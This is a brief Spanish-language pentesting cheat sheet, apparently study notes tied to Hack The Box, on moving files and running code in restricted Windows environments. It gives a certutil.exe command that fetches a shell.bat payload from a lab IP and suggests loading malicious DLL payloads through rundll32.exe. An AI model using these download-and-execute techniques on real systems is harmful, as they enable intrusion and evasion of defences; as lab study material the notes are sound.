### Traspaso de archivos restringido
Si nos vemos en un entorno restringido para el traspaso de archivos, certutil.exe puede ser usado para transmitirlos. Certutil se emplea para manejar certificados, pero tiene una disrupción que permite descargar cosas

    certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

### Entornos restringidos:
Estos casos son muchos, dejo la guia de htb

    https://academy.hackthebox.com/module/67/section/2502

### Explotación por medio de librerías.
Muchas veces nos vemos impedidos de correr archivos .exe, en esos casos podemos intentar correr librerías con payloads maliciosos.

    rundll32.exe <DLL>

